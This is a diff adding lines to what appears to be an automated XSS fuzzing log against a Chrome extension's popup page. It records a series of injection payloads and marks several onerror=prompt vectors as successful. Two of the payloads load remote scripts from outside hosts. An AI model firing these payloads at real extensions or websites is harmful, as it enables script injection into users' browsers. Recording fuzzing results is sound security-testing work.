@@ -27,3 +27,16 @@
 2023-06-22 21:52:30,656, 2023-06-22 21:52:30, Success, CRITICAL, chrome-extension://doodempmapclfbmhppjpoeheilibmcha/popup.html, 8, <img src/onerror=prompt(8)>
 2023-06-22 21:52:31,121, 2023-06-22 21:52:31, Fail, Level <function info at 0x7f722a248670>, chrome-extension://doodempmapclfbmhppjpoeheilibmcha/popup.html, 'NIL', <image src =q onerror=prompt(8)>
 2023-06-22 21:52:32,691, 2023-06-22 21:52:32, Fail, Level <function info at 0x7f722a248670>, chrome-extension://doodempmapclfbmhppjpoeheilibmcha/popup.html, 'NIL', </scrip</script>t><img src =q onerror=p
+2023-06-23 13:54:06,071, 2023-06-23 13:54:06, Success, CRITICAL, chrome-extension://doodempmapclfbmhppjpoeheilibmcha/popup.html, 1, <img src=xss onerror=alert(1)>
+2023-06-23 13:54:07,449, 2023-06-23 13:54:07, Fail, Level <function info at 0x7f3681148670>, chrome-extension://doodempmapclfbmhppjpoeheilibmcha/popup.html, 'NIL', test123
+2023-06-23 13:54:07,574, 2023-06-23 13:54:07, Fail, Level <function info at 0x7f3681148670>, chrome-extension://doodempmapclfbmhppjpoeheilibmcha/popup.html, 'NIL', blaoejds222
+2023-06-23 13:54:08,116, 2023-06-23 13:54:08, Fail, Level <function info at 0x7f3681148670>, chrome-extension://doodempmapclfbmhppjpoeheilibmcha/popup.html, 'NIL', <script src=//brutelogic.com.br/1.js>
+2023-06-23 13:54:09,491, 2023-06-23 13:54:09, Fail, Level <function info at 0x7f3681148670>, chrome-extension://doodempmapclfbmhppjpoeheilibmcha/popup.html, 'NIL', <script>alert(1)<!–
+2023-06-23 13:54:09,612, 2023-06-23 13:54:09, Fail, Level <function info at 0x7f3681148670>, chrome-extension://doodempmapclfbmhppjpoeheilibmcha/popup.html, 'NIL', <script src=//3334957647/1>
+2023-06-23 13:54:09,645, 2023-06-23 13:54:09, Success, CRITICAL, chrome-extension://doodempmapclfbmhppjpoeheilibmcha/popup.html, 8, <image src/onerror=prompt(8)>
+2023-06-23 13:54:10,155, 2023-06-23 13:54:10, Fail, Level <function info at 0x7f3681148670>, chrome-extension://doodempmapclfbmhppjpoeheilibmcha/popup.html, 'NIL', <img src=xss onerror=document.write('qwer$#@!')>
+2023-06-23 13:54:10,180, 2023-06-23 13:54:10, Success, CRITICAL, chrome-extension://doodempmapclfbmhppjpoeheilibmcha/popup.html, 8, <img src =q onerror=prompt(8)>
+2023-06-23 13:54:10,692, 2023-06-23 13:54:10, Success, CRITICAL, chrome-extension://doodempmapclfbmhppjpoeheilibmcha/popup.html, 8, <image src =q onerror=prompt(8)>
+2023-06-23 13:54:11,528, 2023-06-23 13:54:11, Fail, Level <function info at 0x7f3681148670>, chrome-extension://doodempmapclfbmhppjpoeheilibmcha/popup.html, 'NIL', <x oncopy=alert(1)>copy this!
+2023-06-23 13:54:11,565, 2023-06-23 13:54:11, Success, CRITICAL, chrome-extension://doodempmapclfbmhppjpoeheilibmcha/popup.html, 8, <img src/onerror=prompt(8)>
+2023-06-23 13:54:13,600, 2023-06-23 13:54:13, Fail, Level <function info at 0x7f3681148670>, chrome-extension://doodempmapclfbmhppjpoeheilibmcha/popup.html, 'NIL', </scrip</script>t><img src =q onerror=p
